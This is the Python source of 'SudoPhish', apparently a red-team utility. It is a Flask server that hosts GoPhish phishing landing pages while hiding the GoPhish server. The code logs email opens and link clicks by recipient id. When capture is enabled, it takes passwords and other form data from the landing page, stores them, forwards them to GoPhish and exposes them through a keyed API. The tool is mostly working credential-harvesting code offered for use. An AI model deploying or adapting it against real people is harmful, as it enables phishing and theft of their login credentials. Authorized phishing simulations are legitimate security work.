import requests
from flask import Flask, request, render_template, jsonify, redirect, url_for
import json
import string
import random
import getopt
import sys

class Server:
    def __init__(self, gp_url, port, template, capture, redirection, api):
        self.gp_url = gp_url
        self.port = port
        self.template = template
        self.capture = capture
        self.redirection = redirection
        self.api = api

    def webserver(self):
        letters = string.ascii_lowercase
        key = (''.join(random.choice(letters) for i in range(50)))

        app = Flask(__name__)
        app.config['JSON_SORT_KEYS'] = False
        app.config['JSONIFY_PRETTYPRINT_REGULAR'] = True

        @app.route('/', methods=['GET', 'POST'])
        def home():
            if request.method == 'GET':
                headers = {'User-Agent': str(request.headers.get('User-Agent'))}
                try:
                    requests.get(('http://' + self.gp_url + '/?rid=' + str(request.args.get('rid'))), headers=headers)
                except:
                    pass
                with open('tracking.json', 'r+') as output:
                    users = json.load(output)
                    if request.args.get('rid'):
                        users['clicked'].append(request.args.get('rid'))
                    else:
                        pass
                    output.seek(0)
                    json.dump(users, output)
                    output.close()
    
                return(render_template(self.template +'.html'))
            if request.method == 'POST':
                if self.capture == True:
                    headers = {'User-Agent': str(request.headers.get('User-Agent')), 'Content-Type': 'application/x-www-form-urlencoded'}
                    body = request.get_data().decode('utf-8')
                    try:
                        requests.post(('http://' + self.gp_url + '/?rid=' + str(request.args.get('rid'))), data=body, headers=headers)
                    except:
                        pass
                    with open('tracking.json', 'r+') as output:
                        users = json.load(output)
                        if len(body) != 0:
                            users['creds'].append(body)
                        else:
                            pass
                        output.seek(0)
                        json.dump(users, output)
                        output.close()

                    return(redirect(self.redirection, code=302))
                else: 
                    return(redirect(self.redirection, code=302))

        @app.route('/track', methods=['GET'])
        def track():
            headers = {'User-Agent': str(request.headers.get('User-Agent'))}
            try:
                requests.get(('http://' + self.gp_url + '/track?rid=' + str(request.args.get('rid'))), headers=headers)
            except:
                pass
            with open('tracking.json', 'r+') as output:
                users = json.load(output)
                if request.args.get('rid'):
                    users['opened'].append(request.args.get('rid'))
                else:
                    pass
                output.seek(0)
                json.dump(users, output)
                output.close()
            return('{"Thanks"}')

        if self.api == True:
            @app.route('/api', methods=['GET'])
            def api():
                if request.args.get('key') == key:
                    with open('tracking.json', 'r+') as output:
                        details = json.load(output)
                        clicked = details['clicked']
                        unique_clicked = set(clicked)
                        opened = details['opened']
                        unique_opened = set(opened)
                        creds = details['creds']
                        unique_creds = set(creds)
                        clicked_list = []
                        opened_list = []
                        creds_list = []
                        for x in unique_clicked:
                            clicked_list.append(x)
                        for x in unique_opened:
                            opened_list.append(x)
                        for x in unique_creds:
                            creds_list.append(x)

                        if self.capture == True:
                            stats = {"stats": {"unique_opened": str(len(unique_opened)), "unique_clicked": str(len(unique_clicked)), "unique_creds": str(len(unique_creds))}, "details": {"unique_id_opened": opened_list, "unique_id_clicked": clicked_list, "creds": creds_list}}
                        else:
                            stats = {"stats": {"unique_opened": str(len(unique_opened)), "unique_clicked": str(len(unique_clicked))}, "details": {"unique_id_opened": opened_list, "unique_id_clicked": clicked_list}}

                    return(jsonify(stats))
                else:
                    return(redirect(url_for('home')))

        if self.api == True:
            print('\n\nAPI KEY: %s\n\n' % (key))
        else:
            pass

        app.run(port=self.port, host='0.0.0.0')

def usage():
    print('SudoPhish')
    print('')
    print('A web server for GoPhish landing pages that allows you to use GoPhish without exposing the GoPhish server itself.')
    print('')
    print('Usage:')
    print('-h     help       Prints this help message.')
    print('-p     port       Port to run SudoPhish server on. (Default: 8000)')
    print('-d     domain     Domain or IP for GoPhish server without http:// or https://. (Default: 127.0.0.1)')
    print('-t     template   Name of the template to use in the "templates/" folder with not ".html" at the end.')
    print('-c     capture    Enables submission of captured credentials to GoPhish and requries a redirect with the -r flag. (Default: Disabled)')
    print('-r     redirect   Site to redirect to after credential capture or POST request.')
    print('-a     api        Enables the api to be able to see stats for the server. (Access API with http://{your server}/api?key={api key})')
    print('')

if __name__ == '__main__':
    gp_url = '127.0.0.1'
    port = 8000
    template = ''
    capture = False
    redirection = ''
    api = False

    try:
        opts, args = getopt.getopt(sys.argv[1:], 'hp:d:t:cr:a', ['help', 'port', 'domain', 'template', 'capture', 'redirect', 'api'])
    except getopt.GetoptError as e:
        print(str(e))
        sys.exit()

    for o,a in opts:
        if o in ('-h', '--help'):
            usage()
            sys.exit()
        elif o in ('-p', '--port'):
            port = a
        elif o in ('-d', '--domain'):
            gp_url = a
        elif o in ('-t', '--template'):
            template = a
        elif o in ('-c', '--capture'):
            capture = True
        elif o in ('-r', '--redirect'):
            redirection = a
        elif o in ('-a', '--api'):
            api = True

    if template == '':
        print('[ ! ] A template is required to run the server!')
        sys.exit()
    if capture == True and redirection == '':
        print('[ ! ] A redirect location is required with the capture option!')
        sys.exit()
    else:
        pass

    site = Server(gp_url, port, template, capture, redirection, api)
    site.webserver()